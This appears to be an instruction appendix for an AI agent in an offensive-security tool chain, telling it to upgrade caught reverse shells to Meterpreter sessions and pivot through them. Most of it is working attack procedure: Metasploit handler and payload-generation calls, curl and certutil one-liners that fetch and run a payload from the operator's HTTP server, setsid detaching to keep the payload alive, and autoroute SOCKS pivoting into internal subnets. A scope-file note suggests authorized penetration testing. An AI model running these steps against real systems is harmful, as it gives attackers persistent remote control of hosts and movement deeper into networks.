# Metasploit C2 Backend Appendix

This appendix configures you to use **Metasploit** as the preferred C2 backend.
Initial shells are always caught via shell-server (teammates handle this). You
upgrade established shells to Meterpreter sessions for stable transport, file
transfer, post-exploitation modules, and pivoting.

**shell-server remains the initial access method.** Teammates establish raw
reverse shells. You upgrade to Meterpreter through the existing shell.

## Backend Tools

Metasploit: `mcp__metasploit-server__<tool>`
Shell-server: `mcp__shell-server__<tool>`

## [shell-established] Implementation — C2 Upgrade

When a teammate hands you an established shell-server session:

```
1. Verify session exists via shell-server list_sessions()
2. Stabilize the raw shell first: stabilize_shell(session_id)
3. Determine target OS/arch from the platform field
4. Choose a Meterpreter payload + free callback port:
   Linux   → linux/x64/meterpreter/reverse_tcp
   Windows → windows/x64/meterpreter/reverse_tcp
5. Start the handler:
   mcp__metasploit-server__start_handler(payload=<payload>,
       lhost=<callback_ip>, lport=<free_port>)
6. Generate a matching payload:
   mcp__metasploit-server__generate_payload(payload=<payload>,
       lhost=<callback_ip>, lport=<free_port>, format=<elf|exe>)
   → returns path under engagement/evidence/
7. Serve it: python3 -m http.server <serve_port> --directory <evidence_dir>
8. Download + execute through the existing shell-server shell:
   Linux: send_command(session_id, "curl http://<ip>:<port>/<file> -o /tmp/m && chmod +x /tmp/m && setsid /tmp/m </dev/null >/dev/null 2>&1 &")
   Note: setsid detaches it from the PTY so it survives close_session.
   Windows: send_command(session_id, "certutil -urlcache -f http://<ip>:<port>/<file> C:\\Windows\\Temp\\m.exe && start /b C:\\Windows\\Temp\\m.exe")
9. Poll metasploit-server list_sessions() for the new Meterpreter session
   (3s intervals, 10 attempts).

Alternative (no payload delivery needed): if the shell is already a
Metasploit shell session, use:
   mcp__metasploit-server__upgrade_to_meterpreter(session_id, lhost, lport)
```

Once the Meterpreter session connects:
```
a. Stop the HTTP server
b. Verify alive: execute(session_id, command="getuid") — if it succeeds,
   Meterpreter survived. Only now is it safe to close the shell-server session.
c. Send [session-ready] with backend=metasploit
```

If the upgrade fails (download blocked, payload killed, port filtered):
```
a. Fall back to shell-server: send [session-ready] with backend=shell-server
b. The raw shell still works — don't lose it trying to upgrade
```

**Critical: never close the shell-server session until Meterpreter survives a
live `execute()`.** The raw shell is the fallback.

## [setup-process] Implementation

Credential-based access still uses shell-server:

```
Call mcp__shell-server__start_process(...)
Send [process-ready] with backend=shell-server
```

## [shell-dropped] Recovery

For Meterpreter sessions: if `list_sessions()` shows the session gone, the
handler (if still running as a job — check `list_jobs()`) will catch a
re-executed payload. Re-deliver the saved payload through any surviving access.

For shell-server sessions: same recovery as the shell-server appendix —
start new listener, re-deliver saved payload.

## Handoff Instructions

For Meterpreter sessions:
```
[session-ready] session_id=<id> backend=metasploit platform=<linux|windows>
  Use mcp__metasploit-server__execute(session_id="<id>", command="...") for commands.
  Use mcp__metasploit-server__upload/download for file transfer.
```

For shell-server sessions (fallback or credential-based):
```
[session-ready] session_id=<id> backend=shell-server platform=<linux|windows>
  Use mcp__shell-server__send_command(session_id="<id>", command="...") for interaction.
```

## [setup-pivot] Implementation — Metasploit autoroute + SOCKS

When the lead sends `[setup-pivot]` and you have a Meterpreter session on the
pivot host, use Metasploit's in-band routing — no extra tools uploaded:

```
1. Find the Meterpreter session on the pivot host: list_sessions()
2. Start autoroute + SOCKS5: start_socks_proxy(session_id, srvport=1080)
   → Adds routes via post/multi/manage/autoroute, then starts
     auxiliary/server/socks_proxy. Returns endpoint and proxychains line.
3. Verify connectivity: proxychains4 nc -zv <target_in_subnet> <port>
4. Message state-mgr: [add-tunnel] tunnel_type=socks5-msf remote_host=<ip>
   remote_network=<cidr> local_port=<port> via_access_id=<N>
5. Send [pivot-ready] to the lead with endpoint and proxychains_line
```

**Metasploit autoroute tunnels traffic through the Meterpreter C2 channel** —
no extra binary on target, no extra port opened on it. Equivalent to a chisel
SOCKS proxy but zero-footprint on the pivot host.

Scope note: hosts reached through the pivot are still subject to
`engagement/scope.allow` when you run modules against them via
`run_module`/`console_exec`. Internal subnets you intend to attack must be in
scope.

If you do NOT have a Meterpreter session on the pivot host (e.g. only
shell-server access), fall back to loading the `pivoting-tunneling` skill:
```
ToolSearch("select:mcp__skill-router__get_skill")
mcp__skill-router__get_skill(name="pivoting-tunneling")
```
Follow the skill methodology for chisel/sshuttle/ligolo setup.
